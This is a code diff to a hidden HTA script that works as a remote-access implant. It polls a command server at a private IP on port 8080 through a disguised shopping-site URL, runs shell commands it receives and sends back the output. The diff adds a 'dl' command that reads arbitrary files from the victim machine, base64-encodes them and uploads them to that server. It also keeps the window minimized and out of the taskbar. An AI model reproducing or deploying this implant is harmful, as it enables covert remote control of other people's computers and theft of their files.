@@ -6,7 +6,7 @@ window.resizeTo(6, 9);
 
 //Define variables
 var ho = "192.168."
-var me = "12.27"
+var me = "0.189"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -57,6 +57,16 @@ function post(home, response) {
   return res;
 }
 
+function readbinfile(filename) {
+	var stream = new ActiveXObject("ADODB.Stream")
+	stream.Open()
+	stream.Type = 1 //adTypeBinary
+	stream.LoadFromFile(filename)
+	var bytes = stream.Read()
+	stream.Close()
+	return bytes
+}
+
 function str2bin(data) {
    var istream = new ActiveXObject("ADODB.Stream");
    istream.Type = 2
@@ -68,11 +78,16 @@ function str2bin(data) {
    return istream.Read()
 }
 function b64e(data) {
-   var xml = new ActiveXObject("MSXml2.DOMDocument");
-   var element = xml.createElement("Base64Data");
-   element.dataType = "bin.base64";
-   element.nodeTypedValue = str2bin(data);
-   return element.text.replace(/\n/g, "");
+  var xml = new ActiveXObject("MSXml2.DOMDocument");
+  var element = xml.createElement("Base64Data");
+  element.dataType = "bin.base64";
+  if(typeof(data) == "string") {
+    element.nodeTypedValue = str2bin(data);
+  }
+  else {
+    element.nodeTypedValue = data;
+  }
+  return element.text.replace(/\n/g, "");
 }
 
 function bin2str(data) {
@@ -107,9 +122,11 @@ function main()
 
     if(jsObject.cmnd)
     {
+		var rettype = "retval"
 	    //kill
 	    if(jsObject.cmnd == "quit") {
-		    window.close()
+		    window.close(true)
+			self.close()
 	    }
 
 	    else if(jsObject.cmnd == "spawn") {
@@ -137,6 +154,19 @@ function main()
           retval = "[!] Error getting output"
         }
       }
+	  
+	  else if(jsObject.cmnd.split(" ")[0] == "dl") {
+	      var array = jsObject.cmnd.split(" ")
+		  array.shift() //Cuts off the first element in the array
+		  var filepath = array.join(" ")
+	      if(fso.FileExists(filepath)) {
+		    retval = readbinfile(filepath)
+		    rettype = "dl"
+		}
+		else {
+		  retval = "[!] Could not read file: " + filepath
+		}
+	  }
 
 	    //credit to nate and 0sum <3
 	    else {
@@ -151,7 +181,7 @@ function main()
 		      retval = "[!] Error getting output"
 	      }
       }
-      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64e(retval)+'"}';
+      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
       post(home, resp)
     }
@@ -165,3 +195,4 @@ main()
 </script>
 <hta:application caption="no" windowState="minimize" showInTaskBar="no" scroll="no" navigable="no" />
 <body></body></html>
+
